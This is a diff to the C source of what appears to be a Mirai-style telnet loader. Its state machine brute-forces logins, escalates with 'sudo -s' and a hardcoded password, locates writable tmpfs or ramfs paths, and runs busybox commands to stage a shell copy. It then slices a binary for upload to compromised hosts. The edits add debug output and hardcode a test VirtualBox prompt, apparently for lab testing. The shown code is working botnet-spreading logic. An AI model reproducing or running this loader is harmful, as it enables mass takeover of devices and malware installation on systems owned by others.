@@ -182,10 +182,12 @@ int log_recv(int sock, void *buf, int len, int flags)
     {
         char hex_buf[32] = {0};
         sprintf(hex_buf, "state %d - recv: %d", stateTable[sock].state, ret);
-        if (ret != -1)
-            hexDump(hex_buf, buf, ret);
-        else
+        if (ret != -1) {
+//            hexDump(hex_buf, buf, ret);
+            printf("received:\n------------\n%s\n------------\n", buf);
+        } else {
             printf("%s\n", hex_buf);
+        }
     }
     return ret;
         
@@ -197,7 +199,8 @@ int log_send(int sock, void *buf, int len, int flags)
     {
         char hex_buf[32] = {0};
         sprintf(hex_buf, "state %d - send: %d", stateTable[sock].state, len);
-        hexDump(hex_buf, buf, len);
+//        hexDump(hex_buf, buf, len);
+        printf("sent:\n------------\n%s\n------------\n", buf);
     }
     bytes_sent+=len;
     return send(sock, buf, len, flags);
@@ -339,9 +342,9 @@ void *flood(void *par1)
 
     struct epoll_event pevents[25] = {0};
     int ret = 0, i = 0, got = 0, ii = 0;
-    while((ret = epoll_wait( epollFD, pevents, 25, 10000 )) >= 0 || (ret == -1 && errno == EINTR))
+    while((ret = epoll_wait( epollFD, pevents, 25, 1000 )) >= 0 || (ret == -1 && errno == EINTR))
     {
-        if(ret == 0) continue;
+        if(ret == 0) break;
         for(i = 0; i < ret; i++)
         {
             if((pevents[i].events & EPOLLERR) || (pevents[i].events & EPOLLHUP) || (pevents[i].events & EPOLLRDHUP) || (!(pevents[i].events & EPOLLIN) && !(pevents[i].events & EPOLLOUT)))
@@ -456,7 +459,7 @@ void *flood(void *par1)
                             break;
                         }
                         
-                        if (strcasestr(buf, "olly@jolly2-VirtualBox:~$") != NULL || matchPrompt(buf))
+                        if (strcasestr(buf, "olly@jolly2-VirtualBox:~$") != NULL)
                         {
                             //REASONABLY sure we got a good login.
                             sockprintf(state->fd, "sudo -s\r\n");
@@ -470,7 +473,7 @@ void *flood(void *par1)
                 {
                     while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                     {
-                        if (strcasestr(buf, "sudo] password for jolly:") != NULL || matchPrompt(buf))
+                        if (strcasestr(buf, "sudo] password for jolly:") != NULL)
                         {
                             sockprintf(state->fd, "jolly\r\n");
                             state->state = 8;
@@ -506,7 +509,8 @@ void *flood(void *par1)
                         }
                     }
                 }
-                
+
+                // verify busybox is installed
                 if (state->state == 9)
                 {
                     while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
@@ -526,6 +530,14 @@ void *flood(void *par1)
                     {
                         if (strstr(buf, "tmpfs") != NULL || strstr(buf, "ramfs") != NULL)
                         {
+                            if (strstr(buf, "tmpfs") != NULL) {
+                                printf("tmpfs found.\n");
+                            }
+                            if (strstr(buf, "ramfs") != NULL) {
+                                printf("ramfs found.\n");
+                            }
+
+
                             char *tmp_buf = buf;
                             char *start = NULL;
                             char *space = NULL;
@@ -584,6 +596,8 @@ void *flood(void *par1)
                             {
                                 strcpy(state->path[0], "/");
                             }
+
+                            printf("path is: %s\n", state->path[0]);
                             
                             sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[0], state->path[0], state->path[0]);
                             state->state = 100;
@@ -703,6 +717,7 @@ void *flood(void *par1)
                     {
                         handle_found(state->fd);
                     }
+                    printf("Closing and cleaning up\n");
                     closeAndCleanup(state->fd); 
                     is_closed = 1;
                 }
@@ -729,7 +744,12 @@ void *flood(void *par1)
                     int so_error = 0;
                     socklen_t len = sizeof(so_error);
                     getsockopt(state->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
-                    if (so_error) {  handle_failed_connect(state->fd); closeAndCleanup(state->fd); pthread_mutex_unlock(&state->mutex); continue; }
+                    if (so_error)
+                    {
+                        handle_failed_connect(state->fd);
+                        closeAndCleanup(state->fd);
+                        pthread_mutex_unlock(&state->mutex); continue;
+                    }
                     
                     state->state = 1;
                     
@@ -896,11 +916,17 @@ int load_binary(char *path)
     unsigned char ch;
 
     printf("Finding size of binary...\n");
-    if ((fd = open(path, O_RDONLY)) == -1)
+    if ((fd = open(path, O_RDONLY)) == -1) {
+        printf("Could not open binary\n");
         return -1;
+    }
     printf("Opened binary\n");
-    while ((got = read(fd, &ch, 1)) > 0) size++;
+    while ((got = read(fd, &ch, 1)) > 0) {
+        size++;
+//        printf("Current binary size: %d\n", size);
+    }
     close(fd);
+    printf("Binary size: %d\n", size);
 
     printf("Allocating memory for binary...\n");
     binary.num_slices = (int) ceil(size / (float)BYTES_PER_LINE);
@@ -1007,7 +1033,7 @@ int main(int argc, char *argv[ ])
     sprintf(temp, "Connected");
     printf("%-16s", temp);
     memset(temp, 0, 17);
-    sprintf(temp, "Running Thrds");
+    sprintf(temp, "Running Threads");
     printf("%s", temp);
     printf("\n");
 
@@ -1015,8 +1041,37 @@ int main(int argc, char *argv[ ])
 
     char *new;
     new = (char *)malloc(16*6);
-    while (debug_mode ? 1 : running_threads > 0)
+//    while (debug_mode ? 1 : running_threads > 0)
+    while (running_threads > 0)
     {
+        if (debug_mode) {
+            char temp[17] = {0};
+            memset(temp, 0, 17);
+            sprintf(temp, "Loaded");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "State Timeout");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "No Connect");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "Closed Us");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "Logins Tried");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "B/s");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "Connected");
+            printf("%-16s", temp);
+            memset(temp, 0, 17);
+            sprintf(temp, "Running Threads");
+            printf("%s", temp);
+            printf("\n");
+        }
         printf("\r");
         memset(new, '\0', 16*6);
         sprintf(new, "%s|%-15lu", new, found_srvs);
@@ -1028,6 +1083,7 @@ int main(int argc, char *argv[ ])
         sprintf(new, "%s|%-15lu", new, getConnectedSockets());
         sprintf(new, "%s|%-15d", new, running_threads);
         printf("%s", new);
+        printf("\n");
         fflush(stdout);
         bytes_sent=0;
         sleep(1);
